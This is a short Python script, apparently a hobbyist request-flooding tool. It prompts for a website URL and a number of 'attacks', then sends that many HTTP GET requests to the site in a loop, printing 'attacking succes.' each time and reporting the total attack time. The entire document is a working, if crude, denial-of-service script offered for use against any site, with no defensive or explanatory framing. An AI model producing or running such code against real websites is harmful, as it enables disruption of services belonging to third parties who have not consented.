import time
import requests


print("                                CZY                           ")

print("___________________________________________________________________")

print()

link = input("Enter url of the wesite : ")

print() 

times = input("How much times attack : ")

def Attack(link, times):
  url = link
  times = times
  t = 1

  now = time.time()

  while True:
    if int(t) == int(times) + 1:
      print("___________________________________________________________________")
      break
    try:
      s_c = requests.get(url)
      print() 
      print(str(t) + " --> " + str(s_c) + " --> attacking succes.")
    except:
      print()
      print("Error site --> " + str(url) + " , This url doesn't exist.")
      print("___________________________________________________________________")
      break
    t += 1

  end = time.time()
  totale = end - now

  time.sleep(3)

  print() 

  print("Attacked time : " + str(totale) + " seconds.")

Attack(link, times)
